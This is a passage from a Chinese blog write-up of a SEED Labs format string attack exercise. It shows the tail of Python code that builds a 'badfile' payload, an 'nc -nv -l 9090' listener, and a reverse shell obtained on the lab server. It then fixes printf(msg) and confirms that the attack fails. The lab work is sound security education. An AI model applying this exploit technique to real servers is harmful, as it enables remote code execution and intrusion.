class="hljs-string">&#x27;latin-1&#x27;</span>) <br>content[<span class="hljs-number">0</span>:<span class="hljs-number">0</span> + <span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-comment">#格式化字符串后面对应放上参数：需要被改变的2字节值的地址</span><br>content[<span class="hljs-number">64</span>:<span class="hljs-number">72</span>] = (d[<span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>]]).to_bytes(<span class="hljs-number">8</span>,byteorder = <span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">72</span>:<span class="hljs-number">80</span>] = (d[<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>]]).to_bytes(<span class="hljs-number">8</span>,byteorder = <span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">80</span>:<span class="hljs-number">88</span>] = (d[<span class="hljs-built_in">list</span>[<span class="hljs-number">2</span>]]).to_bytes(<span class="hljs-number">8</span>,byteorder = <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment">############################################################</span><br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure>
</li>
<li>
<p>在攻击端使用<code>nc -nv -l 9090</code>对端口9090进行监听。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204104442584.png" srcset="/img/loading.gif" lazyload alt="image-20211204104442584"></p>
</li>
<li>
<p>运行<code>exploit.c</code>，得到<code>badfile</code>。向服务器server-10.9.0.6提供输入，输入为<code>badfile</code>的内容。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204104428944.png" srcset="/img/loading.gif" lazyload alt="image-20211204104428944"></p>
</li>
<li>
<p>在攻击端可以得到服务器server-10.9.0.6的shell：</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204105936022.png" srcset="/img/loading.gif" lazyload alt="image-20211204105936022"></p>
</li>
</ol>
<h2 id="8-任务6：解决问题">8 任务6：解决问题</h2>
<p>还记得 gcc 编译器生成的警告信息吗？ 请解释这是什么意思。 请修复服务器程序中的漏洞，并重新编译。 编译器警告会消失吗？ 你的攻击还有效吗？ 您只需要尝试一种攻击，看看它是否仍然有效。</p>
<h3 id="警告信息">警告信息</h3>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204110238866.png" srcset="/img/loading.gif" lazyload alt="image-20211204110238866"></p>
<p>意思是：字符串格式并不是一个常量，而且没有格式化字符串的参数。</p>
<h3 id="修复漏洞">修复漏洞</h3>
<p>将<code>format.c</code>中<code>printf(msg)</code>更改为<code>printf(&quot;%s&quot;,msg)</code>，并重新编译，发现没有警告。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204111437052.png" srcset="/img/loading.gif" lazyload alt="image-20211204111437052"></p>
<h3 id="重新尝试攻击">重新尝试攻击</h3>
<p>重新建立并开启docker，对32位服务器的target值进行攻击。发现target的值并没有改变，故攻击失败。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204111744294.png" srcset="/img/loading.gif" lazyload alt="image-20211204111744294"></p>
<h2 id="实验心得">实验心得</h2>
<p>​		本次实验任务逐步深入，完成好任务1~3，需要了解<code>va_list</code>指针在<code>printf()</code>下是如何移动的，并且理解<code>%s</code>、<code>%x</code>、<code>%n</code>等格式化字符的具体作用。任务4和任务5在前面的基础上，要求我们加深对栈的布局的理解和shellcode的使用，注意64位服务器的特殊性，用略有不同的方法对64位服务器程序进行攻击。这里我巧用python代码，避免了对精度修饰符的繁杂计算，每次根据服务器输出的不同，修改输入的起始地址和<code>myprintf</code>函数的返回地址所在地址即可完成攻击代码<code>exploit.c</code>。但是这个过程需要细心，我就因为两次低级失误：一次输错了shellcode的起始位置，另一次输错了计算精度修饰符的等式，而损失了不少时间。好在我最终有耐心完成这个实验，能较好地应用所学的知识和技能对格式化字符串漏洞进行攻击。</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/">软件安全实验</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/">软件安全实验</a>
                    
                      <a class="hover-with-bg" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA/">计算机安全导论</a>
                    
                      <a class="hover-with-bg" href="/tags/SeedUbuntu/">SeedUbuntu</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均为博客作者本人编写整理，转载请联系作者！
                  
                </p>
              
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.16/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"gI9ZupcpBXTdxJvxZZrrxydJ-gzGzoHsz","appKey":"Eew9XWCbMWVcoNrQzrg87EP3","path":"window.location.pathname","placeholder":"说点什么","avatar":"mp","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":"trut","recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="" target="_blank" rel="nofollow noopener"><span>Copyrights © 2024 Yuhan</span></a> <i class="iconfont icon-love"></i> <a href="" target="_blank" rel="nofollow noopener"><span>Xiayan</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js" ></script>
  
  
    <script  src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js" ></script>
  
  
    <script defer src="https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>





  

  
    <!-- KaTeX -->
    <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.15.3/katex.min.css" />
  








  
    <!-- Baidu Analytics -->
    <script defer>
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?6da93a2e5d7f160e0f40b273ddbbddac";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
